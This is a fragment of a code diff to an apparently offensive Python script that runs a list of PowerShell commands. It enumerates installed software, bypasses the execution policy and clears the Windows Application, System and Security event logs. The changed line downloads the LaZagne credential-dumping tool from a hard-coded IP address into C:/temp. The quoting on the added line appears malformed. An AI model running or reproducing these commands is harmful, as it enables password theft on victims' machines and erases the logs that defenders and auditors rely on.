@@ -32,7 +32,7 @@ def main():
         '''Get-WmiObject -Class Win32_Product''',
         '''Set-ExecutionPolicy Bypass''',
         '''Clear-EventLog -LogName "Application", "System","Security","Setup","ForwardedEvents" ''',
-        '''LaZagne'''
+        '''iwr 'http://175.45.176.100/LaZagne.exe' -o 'C:/temp/Laz.exe''''
     ]
     output =""
     for cmnd in cmnds_to_run:
